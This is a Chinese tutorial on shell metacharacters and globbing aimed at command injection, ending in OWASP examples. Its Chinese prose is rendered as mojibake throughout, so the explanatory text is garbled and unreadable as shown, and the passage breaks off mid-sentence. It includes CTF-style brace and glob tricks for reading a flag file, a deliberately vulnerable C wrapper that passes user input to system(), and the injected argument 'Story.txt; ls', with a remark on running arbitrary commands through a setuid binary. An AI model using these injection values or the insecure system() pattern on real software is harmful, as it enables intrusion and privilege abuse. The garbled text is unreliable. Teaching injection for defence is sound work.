shellåœ¨æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šè¿”å›ä¸€ä¸ªè¿”å›å€¼ï¼Œè¯¥è¿”å›å€¼ä¿å­˜åœ¨shellå˜é‡ $? ä¸­ã€‚å½“ $? == 0 æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼›å½“ $? == 1 æ—¶ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤±è´¥ã€‚æœ‰æ—¶å€™ï¼Œä¸‹ä¸€æ¡å‘½ä»¤ä¾èµ–å‰ä¸€æ¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚å¦‚ï¼šåœ¨æˆåŠŸåœ°æ‰§è¡Œä¸€æ¡å‘½ä»¤ä¹‹åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ï¼Œæˆ–è€…åœ¨ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åå†æ‰§è¡Œå¦ä¸€æ¡å‘½ä»¤ç­‰ã€‚shellæä¾›äº†\u0026amp;\u0026amp;å’Œ||æ¥å®ç°å‘½ä»¤æ‰§è¡Œæ§åˆ¶çš„åŠŸèƒ½ï¼Œshellå°†æ ¹æ®\u0026amp;\u0026amp;æˆ–||å‰é¢å‘½ä»¤çš„è¿”å›å€¼æ¥æ§åˆ¶å…¶åé¢å‘½ä»¤çš„æ‰§è¡Œã€‚\n\u0026amp;\u0026amp; è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\ncommand1 \u0026amp;\u0026amp; command2 [\u0026amp;\u0026amp; command3 ...]    å‘½ä»¤ä¹‹é—´ä½¿ç”¨ \u0026amp;\u0026amp; è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚\n  åªæœ‰åœ¨\u0026amp;\u0026amp;å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ\u0026amp;\u0026amp;å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œ\n  åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œ\n  $ cp ~/Desktop/1.txt ~/1.txt \u0026amp;\u0026amp; rm ~/Desktop/1.txt \u0026amp;\u0026amp; echo \u0026#34;success\u0026#34; ç¤ºä¾‹ ä¸­çš„å‘½ä»¤é¦–å…ˆä»~/Desktopç›®å½•å¤åˆ¶ 1.txtæ–‡ä»¶åˆ°~ç›®å½•ï¼›æ‰§è¡ŒæˆåŠŸåï¼Œä½¿ç”¨rmåˆ é™¤æºæ–‡ä»¶ï¼›å¦‚æœåˆ é™¤æˆåŠŸåˆ™è¾“å‡ºæç¤ºä¿¡æ¯ã€‚\n|| è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\ncommand1 || command2 [|| command3 ...]    å‘½ä»¤ä¹‹é—´ä½¿ç”¨ || è¿æ¥ï¼Œå®ç°é€»è¾‘æˆ–çš„åŠŸèƒ½ã€‚\n  åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ||å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚è¿™å’Œcè¯­è¨€ä¸­çš„é€»è¾‘æˆ–è¯­æ³•åŠŸèƒ½ç›¸åŒï¼Œå³å®ç°çŸ­è·¯é€»è¾‘æˆ–æ“ä½œã€‚\n  åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚\n  $ rm ~/Desktop/1.txt || echo \u0026#34;fail\u0026#34; å¦‚æœ ~/Desktop ç›®å½•ä¸‹ä¸å­˜åœ¨æ–‡ä»¶ 1.txtï¼Œå°†è¾“å‡ºæç¤ºä¿¡æ¯ã€‚\n;åˆ†å· å½“æœ‰å‡ ä¸ªå‘½ä»¤è¦è¿ç»­æ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨ä¸€è¡Œå†…ï¼Œä¸­é—´ç”¨;åˆ†å¼€ã€‚\n`åå¼•å·ï¼ˆé‡éŸ³ç¬¦ï¼‰ å‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†Unix shellä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚Perlã€PHPä»¥åŠRubyç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹ã€‚ä¾‹å¦‚ä»¥ä¸‹æŒ‡ä»¤:\necho It is now `date` ç­‰ä»·äºï¼š echo It is now ä¸€ 12æœˆ 17 12:16:04 GMT 2018 åœ¨æ­£å¼æ‰§è¡Œæ—¶ä¼šäº§ç”Ÿä»¥ä¸‹è¾“å‡ºç»“æœï¼š It is now ä¸€ 12æœˆ 17 12:16:04 GMT 2018 \u0026lsquo;å•å¼•å· è¢«å•å¼•å·æ‹¬ä½çš„å†…å®¹,å°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ã€‚åœ¨å¼•å·å†…çš„å˜é‡$ç¬¦å·å°†ä¼šå¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†è¢«è§†ä½œä¸€èˆ¬ç¬¦å·å¤„ç†ã€‚\n\u0026ldquo;åŒå¼•å· è¢«åŒå¼•å·æ‹¬ä½çš„å†…å®¹ï¼Œå°†è¢«è§†ä¸ºå•ä¸€å­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šé…ç¬¦çš„æ‰©å±•ï¼Œä½†å…è®¸å˜é‡æ‰©å±• ï¼Œè¿™ç‚¹ä¸å•å¼•å·çš„å¤„ç†æ–¹å¼ä¸åŒ\n()æŒ‡ä»¤ç¾¤ç»„ æ ¼å¼ä¸ºï¼š(command1;command2[;command3\u0026hellip;])\n ä¸€æ¡å‘½ä»¤éœ€è¦ç‹¬å ä¸€ä¸ªç‰©ç†è¡Œï¼Œå¦‚æœéœ€è¦å°†å¤šæ¡å‘½ä»¤æ”¾åœ¨åŒä¸€è¡Œï¼Œå‘½ä»¤ä¹‹é—´ä½¿ç”¨å‘½ä»¤åˆ†éš”ç¬¦ï¼ˆ;ï¼‰åˆ†éš”ã€‚æ‰§è¡Œçš„æ•ˆæœç­‰åŒäºå¤šä¸ªç‹¬ç«‹çš„å‘½ä»¤å•ç‹¬æ‰§è¡Œçš„æ•ˆæœã€‚ è¡¨ç¤ºåœ¨å½“å‰ shell ä¸­å°†å¤šä¸ªå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ () æ‹¬èµ·æ¥çš„å‘½ä»¤åœ¨æ‰§è¡Œå‰é¢éƒ½ä¸ä¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´å‘½ä»¤ç»„åˆéƒ½æ˜¯åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹è¢«æ‰§è¡Œçš„ï¼Œå°½ç®¡å‘½ä»¤ä¸­æœ‰åˆ‡æ¢ç›®å½•çš„å‘½ä»¤ã€‚ å‘½ä»¤ç»„åˆå¸¸å’Œå‘½ä»¤æ‰§è¡Œæ§åˆ¶ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚  ç”¨æ‹¬å·å°†ä¸€ä¸²è¿ç»­æŒ‡ä»¤æ‹¬èµ·æ¥ï¼Œè¿™ç§ç”¨æ³•å¯¹shellæ¥è¯´ï¼Œç§°ä¸ºæŒ‡ä»¤ç¾¤ç»„ã€‚å¦‚ä¸‹é¢çš„ä¾‹å­:\n(cd ~ ; vcgh=`pwd` ;echo $vcgh) æŒ‡ä»¤ç¾¤ç»„æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œshellä¼šä»¥äº§ç”Ÿsubshellæ¥æ‰§è¡Œè¿™ç»„æŒ‡ä»¤ã€‚\n$ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo \u0026#34;fail\u0026#34;) å¦‚æœç›®å½• ~/Desktop ä¸‹ä¸å­˜åœ¨æ–‡ä»¶ 1.txtï¼Œåˆ™æ‰§è¡Œå‘½ä»¤ç»„åˆã€‚ (()) è¿™ç»„ç¬¦å·çš„ä½œç”¨ä¸ let æŒ‡ä»¤ç›¸ä¼¼ï¼Œç”¨åœ¨ç®—æ•°è¿ç®—ä¸Šï¼Œæ˜¯ bash çš„å†…å»ºåŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œåœ¨æ‰§è¡Œæ•ˆç‡ä¸Šä¼šæ¯”ä½¿ç”¨ letæŒ‡ä»¤è¦å¥½è®¸å¤šã€‚\n#!/bin/bash(( a = 10 ))echo -e \u0026#34;inital value, a = $a\\n\u0026#34;(( a++))echo \u0026#34;after a++, a = $a\u0026#34; {}å¤§æ‹¬å· å…¶å®å¤§æ‹¬å·æœ‰ä¸€ç§æ‹¼æ¥å­—ç¬¦ä¸²çš„ç”¨æ³•ï¼Œ{xx,yy,zz,...}è¿™ç§å¤§æ‹¬å·çš„ç»„åˆï¼Œå¸¸ç”¨åœ¨å­—ä¸²çš„ç»„åˆä¸Šï¼Œæ¥çœ‹ä¸ªä¾‹å­\nmkdir {userA,userB,userC}-{home,bin,data} æˆ‘ä»¬å¾—åˆ°userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-dataã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æœ‰\n$ cat {/fl,/fla}{ag,g} flag{xxx} cat: /flg: No such file or directory cat: /flaag: No such file or directory flag{xxx} []ä¸­æ‹¬å· å¸¸å‡ºç°åœ¨æµç¨‹æ§åˆ¶ä¸­ï¼Œæ‰®æ¼”æ‹¬ä½åˆ¤æ–­å¼çš„ä½œç”¨ã€‚if [ \u0026quot;$?\u0026quot; != 0 ]thenecho \u0026quot;Executes error\u0026quot;exit1fiã€‚è¿™ä¸ªç¬¦å·åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ‹…ä»»ç±»ä¼¼ \u0026ldquo;èŒƒå›´\u0026rdquo; æˆ– \u0026ldquo;é›†åˆ\u0026rdquo; çš„è§’è‰²ã€‚\n$ cat /fl[0-z]g flag{xxx} [[ ]] è¿™ç»„ç¬¦å·ä¸å…ˆå‰çš„ [] ç¬¦å·ï¼ŒåŸºæœ¬ä¸Šä½œç”¨ç›¸åŒï¼Œä½†å¥¹å…è®¸åœ¨å…¶ä¸­ç›´æ¥ä½¿ç”¨||ä¸\u0026amp;\u0026amp;é€»è¾‘ç­‰ç¬¦å·ã€‚\n#!/bin/bashread akif [[ $ak \u0026gt; 5 || $ak\u0026lt; 9 ]]thenecho $akfi å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ« é‚£ä¹ˆï¼Œä¸‹é¢åˆæ¶‰åŠåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«ã€‚\n å•å°æ‹¬å·ï¼Œ(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚æŠŠcommand groupæ”¾åœ¨subshellå»æ‰§è¡Œï¼Œä¹Ÿå«åšnested sub-shellã€‚ å•å¤§æ‹¬å·ï¼Œ{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚èŠ±æ‹¬å·æ˜¯åœ¨åŒä¸€ä¸ª shell å…§å®Œæˆï¼Œä¹Ÿç§°ä¸º non-namedcommand groupã€‚  æ‰€ä»¥è¯´ï¼Œå¦‚æœåœ¨shellé‡Œé¢æ‰§è¡Œâ€œå‡½æ•°â€ï¼Œéœ€è¦ç”¨åˆ°{}ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤ç¾¤ç»„ä¹ˆã€‚ ä¸è¿‡ï¼Œæ ¹æ®å®æµ‹ï¼Œtest=$(ls -a)å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯test=${lsâ€“a}è¯­æ³•ä¸Šé¢æ˜¯æœ‰é”™è¯¯çš„ã€‚ä¼°è®¡ä¹Ÿå’Œä¸Šé¢æ‰€è¯´çš„åŸå› æœ‰å…³ã€‚\nå¦å¤–ï¼Œä»ç½‘ä¸Šæ‘˜å½•çš„åŒºåˆ«å¦‚ä¸‹ï¼š\n  ()åªæ˜¯å¯¹ä¸€ä¸²å‘½ä»¤é‡æ–°å¼€ä¸€ä¸ªå­shellè¿›è¡Œæ‰§è¡Œ\n  {}å¯¹ä¸€ä¸²å‘½ä»¤åœ¨å½“å‰shellæ‰§è¡Œ\n  ()å’Œ{}éƒ½æ˜¯æŠŠä¸€ä¸²çš„å‘½ä»¤æ”¾åœ¨æ‹¬å·é‡Œé¢ï¼Œå¹¶ä¸”å‘½ä»¤ä¹‹é—´ç”¨;å·éš”å¼€\n  ()æœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥ä¸ç”¨åˆ†å·\n  {}æœ€åä¸€ä¸ªå‘½ä»¤è¦ç”¨åˆ†å·\n  {}çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼\n  ()é‡Œçš„å„å‘½ä»¤ä¸å¿…å’Œæ‹¬å·æœ‰ç©ºæ ¼\n  ()å’Œ{}ä¸­æ‹¬å·é‡Œé¢çš„æŸä¸ªå‘½ä»¤çš„é‡å®šå‘åªå½±å“è¯¥å‘½ä»¤ï¼Œä½†æ‹¬å·å¤–çš„é‡å®šå‘åˆ™å½±å“åˆ°æ‹¬å·é‡Œçš„æ‰€æœ‰å‘½ä»¤\n  è¿™é‡Œå¼•å‡ºæ¥[..]å’Œ[[...]]çš„åŒºåˆ«ï¼šä½¿ç”¨[[...]]æ¡ä»¶åˆ¤æ–­ç»“æ„, è€Œä¸æ˜¯[...], èƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯.æ¯”å¦‚\u0026amp;\u0026amp;, ||,\u0026lt;,å’Œ\u0026gt; æ“ä½œç¬¦èƒ½å¤Ÿæ­£å¸¸å­˜åœ¨äº[[ ]]æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­, ä½†æ˜¯å¦‚æœå‡ºç°åœ¨[]ç»“æ„ä¸­çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚\nå¯¹{}å’Œ()è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤ï¼Œ è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚\nè¾“å…¥è¾“å‡º/é‡å®šå‘ \u0026gt; \u0026gt;\u0026gt; \u0026lt; \u0026lt;\u0026lt; :\u0026gt; \u0026amp;\u0026gt; 2\u0026amp;\u0026gt; 2\u0026lt;\u0026gt;\u0026gt;\u0026amp; \u0026gt;\u0026amp;2 æ–‡ä»¶æè¿°ç¬¦(File Descriptor)ï¼Œç”¨ä¸€ä¸ªæ•°å­—ï¼ˆé€šå¸¸ä¸º0-9ï¼‰æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ã€‚\n   æ–‡ä»¶æè¿°ç¬¦ åç§° å¸¸ç”¨ç¼©å†™ é»˜è®¤å€¼     0 æ ‡å‡†è¾“å…¥ stdin é”®ç›˜   1 æ ‡å‡†è¾“å‡º stdout å±å¹•   2 æ ‡å‡†é”™è¯¯è¾“å‡º stderr å±å¹•    æˆ‘ä»¬åœ¨ç®€å•åœ°ç”¨\u0026lt;æˆ–\u0026gt;æ—¶ï¼Œç›¸å½“äºä½¿ç”¨0\u0026lt;æˆ–1\u0026gt;ï¼ˆä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚\n  cmd \u0026gt; file æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ã€‚å¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºåŸæœ‰æ–‡ä»¶ï¼Œä½¿ç”¨bashçš„noclobberé€‰é¡¹å¯ä»¥é˜²æ­¢å¤ç›–åŸæœ‰æ–‡ä»¶ã€‚\n  cmd \u0026raquo; file æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ï¼Œå¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æŠŠä¿¡æ¯åŠ åœ¨åŸæœ‰æ–‡ä»¶åé¢ã€‚\n  cmd \u0026lt; file ä½¿cmdå‘½ä»¤ä»fileè¯»å…¥\n  cmd \u0026laquo; text ä»å‘½ä»¤è¡Œè¯»å–è¾“å…¥ï¼Œç›´åˆ°ä¸€ä¸ªä¸textç›¸åŒçš„è¡Œç»“æŸã€‚é™¤éä½¿ç”¨å¼•å·æŠŠè¾“å…¥æ‹¬èµ·æ¥ï¼Œæ­¤æ¨¡å¼å°†å¯¹è¾“å…¥å†…å®¹è¿›è¡Œshellå˜é‡æ›¿æ¢ã€‚å¦‚æœä½¿ç”¨\u0026lt;\u0026lt;- ï¼Œåˆ™ä¼šå¿½ç•¥æ¥ä¸‹æ¥è¾“å…¥è¡Œé¦–çš„tabï¼Œç»“æŸè¡Œä¹Ÿå¯ä»¥æ˜¯ä¸€å †tabå†åŠ ä¸Šä¸€ä¸ªä¸textç›¸åŒçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒå¾Œé¢çš„ä¾‹å­ã€‚\n  cmd \u0026laquo;\u0026lt; word æŠŠwordï¼ˆè€Œä¸æ˜¯æ–‡ä»¶wordï¼‰å’Œåé¢çš„æ¢è¡Œä½œä¸ºè¾“å…¥æä¾›ç»™cmdã€‚\n  cmd \u0026lt;\u0026gt; file ä»¥è¯»å†™æ¨¡å¼æŠŠæ–‡ä»¶fileé‡å®šå‘åˆ°è¾“å…¥ï¼Œæ–‡ä»¶fileä¸ä¼šè¢«ç ´åã€‚ä»…å½“åº”ç”¨ç¨‹åºåˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚\n  cmd \u0026gt;| file åŠŸèƒ½åŒ\u0026gt;ï¼Œä½†å³ä¾¿åœ¨è®¾ç½®äº†noclobberæ—¶ä¹Ÿä¼šå¤ç›–fileæ–‡ä»¶ï¼Œæ³¨æ„ç”¨çš„æ˜¯|è€Œéä¸€äº›ä¹¦ä¸­è¯´çš„!ï¼Œç›®å‰ä»…åœ¨cshä¸­ä»æ²¿ç”¨\u0026gt;!å®ç°è¿™ä¸€åŠŸèƒ½ã€‚\n  : \u0026gt; filename\næŠŠæ–‡ä»¶filenameæˆªæ–­ä¸º0é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶(ä¸touchçš„æ•ˆæœç›¸åŒ).\n  cmd \u0026gt;\u0026amp;n\næŠŠè¾“å‡ºé€åˆ°æ–‡ä»¶æè¿°ç¬¦n\n  cmd m\u0026gt;\u0026amp;n\næŠŠè¾“å‡ºåˆ°æ–‡ä»¶ç¬¦mçš„ä¿¡æ¯é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦n\n  cmd \u0026gt;\u0026amp;-\nå…³é—­æ ‡å‡†è¾“å‡º\n  cmd \u0026lt;\u0026amp;n\nè¾“å…¥æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦n\n  cmd m\u0026lt;\u0026amp;n\nmæ¥è‡ªæ–‡ä»¶æè¿°å„ä¸ªn\n  cmd \u0026lt;\u0026amp;-\nå…³é—­æ ‡å‡†è¾“å…¥\n  cmd \u0026lt;\u0026amp;n-\nç§»åŠ¨è¾“å…¥æ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚\n  cmd \u0026gt;\u0026amp;n-\nç§»åŠ¨è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚ æ³¨æ„ï¼š \u0026gt;\u0026amp;å®é™…ä¸Šå¤åˆ¶äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä½¿å¾—cmd \u0026gt; file 2\u0026gt;\u0026amp;1ä¸cmd 2\u0026gt;\u0026amp;1 \u0026gt;fileçš„æ•ˆæœä¸ä¸€æ ·ã€‚\n  é€šé…ç¬¦ è¿˜æœ‰ä¸€ç±»é€šé…ç¬¦ï¼Œé¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shellé€šé…ç¬¦/globæ¨¡å¼:\n glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ /etc/glob ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼\n è¯­æ³•    å­—ç¬¦ è§£é‡Š     * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦   ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦   [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ   [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ   [!list] åŒ[^list]   {str1,str2,\u0026hellip;} åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ   IFS ç”± \u0026lt; space \u0026gt; æˆ– \u0026lt; tab \u0026gt; æˆ– \u0026lt; enter \u0026gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ   CR ç”± \u0026lt; enter \u0026gt; äº§ç”Ÿ   ! æ‰§è¡Œ history ä¸­çš„å‘½ä»¤    ä»¥åŠè¿˜æœ‰ä¸“ç”¨å­—ç¬¦é›†\n   å­—ç¬¦ æ„ä¹‰     [:alnum:] ä»»æ„æ•°å­—æˆ–è€…å­—æ¯   [:alpha:] ä»»æ„å­—æ¯   [:space:] ç©ºæ ¼   [:lower:] å°å†™å­—æ¯   [:digit:] ä»»æ„æ•°å­—   [:upper:] ä»»æ„å¤§å†™å­—æ¯   [:cntrl:] æ§åˆ¶ç¬¦   [:graph:] å›¾å½¢   [:print:] å¯æ‰“å°å­—ç¬¦   [:punct:] æ ‡ç‚¹ç¬¦å·   [:xdigit:] åå…­è¿›åˆ¶æ•°   [:blank:] ç©ºç™½å­—ç¬¦     åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚[[:space:]] æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦  ä¸¾ä¸ªä¾‹å­ ä»¥ä¸‹äº‹ä¾‹Example 1-6æ¥æºäºOWASP\nExample 1 ä»¥ä¸‹ä»£ç æ˜¯UNIXå‘½ä»¤catçš„åŒ…è£…å™¨ï¼Œå®ƒå°†æ–‡ä»¶çš„å†…å®¹æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚ å®ƒä¹Ÿæ˜¯å¯ä»¥è¢«æ³¨å…¥çš„ï¼š\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { char cat[] = \u0026#34;cat \u0026#34;; char *command; size_t commandLength; commandLength = strlen(cat) + strlen(argv[1]) + 1; command = (char *) malloc(commandLength); strncpy(command, cat, commandLength); strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command); return (0); } æˆ‘ä»¬ç¼–è¯‘å®Œä¹‹åå¯ä»¥é€šè¿‡ä»¥ä¸‹æ“ä½œæ­£å¸¸ä½¿ç”¨\n$ ./catWrapper Story.txt When last we left our heroes... ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¿™è¡Œçš„æœ«å°¾ä¹‹ååŠ ä¸€ä¸ª;å’Œå¦ä¸€ä¸ªå‘½ä»¤ï¼Œé‚£ä¹ˆå‘½ä»¤catWrapperæ‰§è¡Œè€Œä¸”ä¹Ÿä¸ä¼šå‡ºé”™ã€‚\n$ ./catWrapper \u0026#34;Story.txt; ls\u0026#34; When last we left our heroes... Story.txt doubFree.c nullpointer.c unstosig.c www* a.out* format.c strlen.c useFree* catWrapper* misnull.c strlength.c useFree.c commandinjection.c nodefault.c trunc.c writeWhatWhere.c å¦‚æœå°†catWrapperè®¾ç½®ä¸ºå…·æœ‰æ¯”æ ‡å‡†ç”¨æˆ·æ›´é«˜çš„æƒé™çº§åˆ«ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯¥æ›´é«˜æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\nExample 2 ä»¥ä¸‹ç®€å•ç¨‹åºæ¥å—æ–‡ä»¶åä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å°†æ–‡ä»¶çš„å†…å®¹æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚ è¯¥ç¨‹åºå®‰è£…äº†setuid rootï¼Œå‡è®¾åŸæœ¬å®ƒæ—¨åœ¨ç”¨ä½œå­¦ä¹ 